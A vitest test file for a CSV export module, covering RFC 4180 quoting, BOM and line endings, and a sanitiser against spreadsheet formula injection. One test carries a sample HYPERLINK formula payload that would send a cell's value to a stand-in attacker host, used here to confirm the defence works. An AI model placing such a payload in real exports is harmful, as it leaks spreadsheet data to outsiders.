/**
 * `lib/export/csv.ts` — pure RFC 4180 encoding, no database involved.
 */

import { describe, expect, it } from "vitest";

import { buildCsv, csvField, csvRow, csvSafeTextField, CSV_BOM } from "@/lib/export/csv";

describe("csvField", () => {
  it("leaves a plain value unquoted", () => {
    expect(csvField("Player C's place")).toBe("Player C's place");
    expect(csvField(42)).toBe("42");
    expect(csvField(true)).toBe("true");
    expect(csvField(false)).toBe("false");
  });

  it("quotes a value containing a comma", () => {
    expect(csvField("Smith, Jones")).toBe('"Smith, Jones"');
  });

  it("quotes and doubles an embedded quote", () => {
    expect(csvField('Say "hi"')).toBe('"Say ""hi"""');
  });

  it("quotes a value containing a line break", () => {
    expect(csvField("line one\nline two")).toBe('"line one\nline two"');
    expect(csvField("line one\r\nline two")).toBe('"line one\r\nline two"');
  });
});

describe("csvSafeTextField", () => {
  it("leaves an ordinary value untouched", () => {
    expect(csvSafeTextField("Player C")).toBe("Player C");
  });

  it("neutralizes a formula-shaped payload like the PRD's HYPERLINK example", () => {
    const payload = '=HYPERLINK("https://attacker.example/"&A2,"Player C")';
    const result = csvSafeTextField(payload);
    // Defused with a leading apostrophe, then RFC 4180 quoted (the payload
    // contains embedded double quotes, which still need doubling).
    expect(result).toBe(`"'${payload.replace(/"/g, '""')}"`);
    expect(result.startsWith('"=') || result.startsWith("=")).toBe(false);
  });

  it("defuses every risky leading character before quoting", () => {
    for (const risky of ["=1+1", "+1+1", "-1+1", "@SUM(A1)", "\t=1+1", "\r=1+1"]) {
      const result = csvSafeTextField(risky);
      expect(result.startsWith("=") || result.startsWith('"=')).toBe(false);
    }
  });

  it("prefixes a leading apostrophe so Excel reads the cell as literal text, not a formula", () => {
    expect(csvSafeTextField("=1+1")).toBe("'=1+1");
    expect(csvSafeTextField("+1+1")).toBe("'+1+1");
    expect(csvSafeTextField("-1+1")).toBe("'-1+1");
    expect(csvSafeTextField("@SUM(A1)")).toBe("'@SUM(A1)");
  });

  it("still applies RFC 4180 quoting after defusing, when the defused value needs it", () => {
    // Starts with "=" (needs defusing) and contains a comma (needs quoting).
    expect(csvSafeTextField("=SUM(A1,A2)")).toBe('"\'=SUM(A1,A2)"');
  });

  it("does not touch a value that merely contains a formula character mid-string", () => {
    expect(csvSafeTextField("Player = winner")).toBe("Player = winner");
  });
});

describe("csvRow", () => {
  it("comma-joins fields with no trailing line ending", () => {
    expect(csvRow(["a", 1, true])).toBe("a,1,true");
  });

  it("routes only the given indices through csvSafeTextField", () => {
    const row = csvRow(["1", "=1+1", "safe"], new Set([1]));
    expect(row).toBe('1,\'=1+1,safe');
  });
});

describe("buildCsv", () => {
  it("starts with a UTF-8 BOM and CRLF-terminates every line, including the last", () => {
    const csv = buildCsv(["a", "b"], [["1", "2"]]);
    expect(csv.startsWith(CSV_BOM)).toBe(true);
    expect(csv).toBe(`${CSV_BOM}a,b\r\n1,2\r\n`);
  });

  it("a header with no rows is still a valid, terminated file", () => {
    const csv = buildCsv(["a", "b"], []);
    expect(csv).toBe(`${CSV_BOM}a,b\r\n`);
  });
});
